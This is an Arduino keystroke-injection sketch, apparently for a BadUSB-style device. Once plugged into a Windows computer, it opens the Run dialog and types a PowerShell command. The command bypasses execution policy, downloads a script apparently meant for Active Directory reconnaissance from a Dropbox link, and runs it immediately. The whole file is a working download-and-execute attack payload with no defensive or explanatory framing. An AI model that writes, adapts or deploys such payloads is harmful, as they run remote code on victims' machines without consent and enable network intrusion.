#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("powershell -NoProfile -NonInteractive -Exec Bypass; $pl = iwr 'https://www.dropbox.com/scl/fi/a3f2yt35dp7tddwf5yk9c/AD-recon-january-31.ps1?rlkey=0hakkqzfyrqqjo5o5odjj88pm&dl=1'; invoke-expression $pl");
  typeKey(KEY_RETURN);

  // Ending streamCMD
  
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}